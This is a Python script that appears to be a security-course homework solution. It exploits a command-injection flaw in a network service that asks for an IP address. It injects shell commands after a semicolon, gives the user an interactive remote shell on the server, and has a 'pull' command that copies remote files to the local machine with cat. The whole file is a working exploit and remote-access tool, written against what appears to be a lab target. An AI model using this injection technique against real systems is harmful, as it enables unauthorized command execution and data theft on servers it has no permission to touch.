#! /usr/bin/env python3

"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def print_help():
    usage = "\
1) `shell`                               Drop into an interactive shell and allow users to gracefully `exit` \n\
2) `pull <remote-path> <local-path>`     Download files \n\
3) `help`                                Shows this help menu \n\
4) `quit`                                Quit the shell\n"
    print(usage)

# executes the command returns the output and the current directory
def send_cmd(cmd):
    # Setup socket
    s = socket.socket()
    s.connect((host, port))
    data = s.recv(1024)
    while b'Enter IP address:' not in data:
        data = s.recv(1024)

    # send command to server
    s.send('; {}; echo \' $$$ \'; pwd\n'.format(cmd).encode())
    data = s.recv(1024)
    while b'\n' not in data:
        data += s.recv(1024)

    # Close socket
    s.close()

    # Figure out which parts are the command and which are pwd
    splitted = data.rpartition(b'$$$')
    return splitted[0], splitted[2]

def shell():
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    current_dir = '/'
    while True:
        # Get command
        cmd = input('{}> '.format(current_dir))

        if cmd == 'exit':
            break

        result = send_cmd('cd {}; {}'.format(current_dir, cmd))
        print(result[0].decode())
        current_dir = result[1].decode().strip()

def pull(args):
    if len(args) > 2:
        print_help()
        return

    remote = args[0]
    local = args[1]
    data = send_cmd('cat {}'.format(remote))[0]
    with open(local, 'xb') as f:
        f.write(data)

if __name__ == '__main__':
    while True:
        cmd_in = input("> ")
        splitted = cmd_in.split(' ')
        cmd = splitted[0]
        args = splitted[1:]

        if cmd == 'shell':
            shell()
        elif cmd == 'pull':
            pull(args)
        elif cmd == 'quit':
            break
        else:
            print_help()
